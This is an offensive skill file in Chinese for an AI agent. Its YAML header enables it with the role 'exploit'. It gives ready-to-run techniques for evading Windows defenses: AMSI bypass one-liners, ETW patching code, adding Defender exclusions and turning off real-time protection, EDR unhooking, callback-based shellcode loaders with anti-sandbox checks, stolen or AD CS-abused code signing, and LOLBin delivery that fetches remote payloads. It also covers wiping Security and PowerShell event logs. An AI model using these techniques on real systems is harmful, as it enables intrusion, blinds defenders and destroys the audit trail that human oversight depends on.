---
name: evasion-defense-bypass
description: 免杀与防御对抗：AMSI 补丁、ETW 致盲、Defender 排除、shellcode 加载器（系统调用/回调）、证书签名滥用、ETW/日志痕迹清理
whenToUse: 载荷被 AMSI/Defender 拦截、需要绕过 EDR 的用户态钩子、需要让.ps1/.exe 落地不报毒、需要抹掉操作的事件日志痕迹
role: exploit
enabled: true
---

# 免杀与防御对抗（AMSI / ETW / Defender / EDR）

目标:让载荷在目标机上**落地不报毒、执行不被拦**。分四层:AMSI 层、ETW 层、EDR 用户态钩子层、静态特征层。
每层独立可用;组合使用效果最好。**判定红线:载荷成功执行 whoami 并回显才算过防**(不是"没弹窗")。

## 一、AMSI 补丁(PowerShell 5.1 / 7 通用)

### 原理
AMSI 在 powershell.exe 进程内加载 amsi.dll,内存里把 AmsiScanBuffer 的结果改掉。
### 经典补丁(C# 反射,PS 内一行)
```powershell
# 破坏 AmsiScanBuffer 的 fail-fast(对所有后续扫描生效)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
- 立即生效,当前会话内所有扫描直接放行
- **注意**:脚本本身如果已被 AMSI 扫过(执行前),这条救不了——先用编码/拆分方式送入(见下)

### 强制版(直接 patch amsi.dll 内存)
```powershell
$z=[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[Char]85+'tils')
$f=$z.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)
```
- 用 `[Char]85` 拆掉 "Utils" 字符串,避免脚本自身被静态特征扫出

### 落地不扫描:编码投递
```powershell
powershell -enc <BASE64UTF16LE>          # 整段编码,执行前不落盘
IEX $(New-Object IO.StreamReader(([IO.MemoryStream]::new([Convert]::FromBase64String('<B64>'))))).ReadToEnd()
```
- 生成:`[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))`

## 二、ETW 致盲(TOE 让 .NET/PowerShell 日志断流)

### 补丁 ETW EventWrite(对当前进程)
```csharp
// lane 常用:把 ntdll!EtwEventWrite 头部改成 ret(0xC3)
var p = GetProcAddress(GetModuleHandle("ntdll"), "EtwEventWrite");
VirtualProtect(p, 1, 0x40, out _); Marshal.WriteByte(p, 0xC3);
```
- 效果:当前进程的 ETW 事件(Sysmon 依赖部分、.NET Assembly 加载日志)不再上报
- 配套:同样 patch `EtwEventWriteEx` / `ntdll!EtwEventWriteFull`

### Sysmon 驱动对抗(高权限)
```powershell
# Sysmon 事件源自 ETW providers;把 Sysmon64 驱动规则弄掉需要管理员+驱动访问
fltmc filters                          # 看过滤驱动
sc query sysmon64                      # 确认存在
```
- 常规做法是**不硬碰驱动**,只清事件通道(见第五节)避免触发删除告警

## 三、Defender / EDR 用户态钩子

### Defender 排除项(需管理员)
```powershell
Add-MpPreference -ExclusionPath 'C:\ProgramData\...'
Add-MpPreference -ExclusionProcess 'your.exe'
Add-MpPreference -ExclusionExtension '.exe','.dll'
Get-MpPreference | select -Expand Exclusion*   # 验证
```
- **先加排除再落载荷**;顺序反了会被记忆体扫描仍查到

### 关闭实时防护(TAM 需满意)
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -SubmitSamplesConsent 2 -MAPSReporting 0
```
- 现代版本需要 TrustedInstaller 权限:`psexec -s -i reg add ...` 或用   `Set-MpPreference` 前先 `whoami /priv` 确认持有 Tamper Guard 之外的场景

### unhooking(EDR DLL 还原)
```powershell
# 把 ntdll .text 段从磁盘干净副本重映射回内存(经典 unhook)
$c=Get-Content C:\windows\system32\ntdll.dll -Encoding Byte -ReadCount 0
# 或用工具:SharpUnhook / unhook-bof 在 CS/Sliver 里直接跑
```
- unhook 后 CreateRemoteThread/WriteProcessMemory 等敏感 API 恢复原字节,行为检测依赖的用户态回调失效

## 四、载荷形态(静态过检)

### shellcode 加载器要点
- **不要**明文 syscalls 序列;用间接 syscall(Hell's Gate → Halo's Gate / SysWhispers3 生成的乱序 stub)
- 加载器骨架:虚分配 → 解密(AES/RC4 运行时)→ 修改 PPEA 避免 RWX → 线程执行(回调优先):
  ```c
  EnumFontsW(GetDC(0), NULL, (FONTENUMPROC)shellcode, 0);   // 回调执行,避开 CreateThread 特征
  CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE)shellcode);
  ```
- 分段解密:执行到哪段解哪段(anti-sandbox:检查鼠标移动/uptime>20min 再解密)

### 签名与伪装
- 买/偷代码签名证书对载荷签名(域内可滥用 AD CS:`certipy req -ca CORP-CA -template User`)
- LOLBin 投递:`mshta http://.../a.hta`、`regsvr32 /s /n /u /i:http://... a.sct`、`rundll32 javascript:...`
- 附加资源+版本信息+图标(Resource Hacker),把 PDB 路径清掉

## 五、痕迹清理

```powershell
wevtutil cl Security && wevtutil cl System && wevtutil cl "Windows PowerShell"
Get-WinEvent -ListLog *op* | % { wevtutil cl $_.LogName }        # 操作日志
```
- 顺序:**离开时清一次**,不是每步清(每步清反而产生 1102 事件堆积)
- 机器上的 Sysmon 日志若转发到 SIEM,本地清理无意义——这是硬边界,如实记录

## 红线(完成判定)
- 载荷执行 `whoami` 回显成功(不是"没弹警告")
- Defender `Get-MpPreference` 确认排除项在
- 事件日志已清(`wevtutil qe Security /c:1` 无近期记录)

## 衔接
- 拿到初始执行 → `shell-handler` / `lateral-movement` / `c2-persistence`
- 凭据获取前的 LSASS 转储会被 EDR 拦 → 先做本技能的 unhook + 排除
